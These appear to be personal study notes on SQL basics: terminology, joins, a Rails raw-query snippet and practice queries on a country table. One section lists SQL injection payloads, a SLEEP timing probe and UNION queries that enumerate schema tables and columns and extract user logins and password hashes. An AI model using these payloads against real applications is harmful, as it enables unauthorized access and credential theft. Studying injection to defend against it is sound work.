# SQL

* Designed to work with *Relational Databases*
* A query result is best described as a *record* (i.e., not a row as query results may be columns as well)

## Language

* Relational Database: a data store that is capable of representing relationships between different data sets.
  - displayed in rows and columns
* DML: add, query, manipulate, delete data from tables and datasets.
* DDL: defines tables, indexes, and relationships.
* DMS - Database Management System: Oracle, PostgreSQL, SQLite, MySQL

## LeftOuterJoin

Keeps all the records on the left after the join occurs - otherwise, it would just join with the right table and return only those results that can be joined

To practice writing in rails:

```SQL
ActiveRecord::Base
  .connection
  .execute(
    "SELECT \"events\".*
    FROM \"events\"
    ORDER BY \"events\".updated_at DESC"
  )
  .to_a.first
```

## SQL Injection

[Running an SQL Injection Attack - Computerphile](https://youtu.be/ciNHn38EyRc)

```SQL
-- SLEEP is an SQL command
SELECT ? FROM ? WHERE ? LIKE %hammer% AND 0 = SLEEP(2);

-- UNION Appends - makes sure column count matches

-- Get the table names of all the tables
-- we are selecting 3 columns b/c it must match the original SELECT call
SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.table); --%';

-- Get the column names of the users table
SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users'); --%';

-- GEt the particular data for each user
SELECT ?,?,? FROM ? WHERE ? LIKE %hammer% UNION (SELECT uLogin, uHash, uType FROM users); --%''
```

![SQL_Injected_Products_Table](/assets/sql_injected_products_table.png)

## HTTP vs TCP vs UDP

## SQL Practice

```SQL
  -- ORDER By
  SELECT country.* FROM country WHERE country.code <> "AFG" ORDER BY country.code;

  -- Not Equal To <>
  SELECT country.* FROM country WHERE country.code <> "AFG" ORDER BY country.code;

  -- AS for a column name
  SELECT country.name, country.code, country.IndepYear AS 'Year of Independence' FROM country WHERE country.code <> "AFG" ORDER BY country.code;
```

### Expressions

```SQL
-- COUNT
SELECT COUNT('country.*') FROM country;
-- COUNT('country.*')
-- 239
SELECT COUNT(*) FROM country;
-- COUNT(*)
-- 239
```

```SQL
-- Arithmetic
SELECT 1+10;
```

*SQLite* [date and time functions](https://sqlite.org/lang_datefunc.html)

```SQL
-- This is SQLite specific
SELECT strftime('%j %H %w %f', datetime());
-- strftime('%j %H %w %f', datetime())
-- 228 12 3 11.000
```
